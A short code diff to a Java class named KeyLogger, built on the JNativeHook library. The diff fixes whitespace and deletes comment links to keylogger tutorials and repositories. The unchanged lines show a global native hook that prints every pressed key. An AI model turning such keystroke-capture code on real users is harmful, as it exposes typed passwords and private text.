@@ -54,7 +54,7 @@ public class KeyLogger implements NativeKeyListener {
 		System.out.println(a);
 		
 	}
-	
+
 	/* Key Pressed */
     public void nativeKeyPressed(NativeKeyEvent e) {
         System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
@@ -110,9 +110,4 @@ public class KeyLogger implements NativeKeyListener {
 		GlobalScreen.registerNativeHook();
 		GlobalScreen.addNativeKeyListener(new KeyLogger());
 	}
-	//https://juanpinzon-1992.blogspot.com.co/2014/10/como-crear-un-key-logger-en-java.html
-	//https://github.com/kwhat/jnativehook
-	//https://github.com/samir-joglekar/keylogger-java
-	//https://stackoverflow.com/questions/15758685/how-to-write-logs-in-text-file-when-using-java-util-logging-logger/15758768
-	//https://github.com/kwhat/jnativehook/blob/2.1/src/java/org/jnativehook/example/NativeHookDemo.java
 }
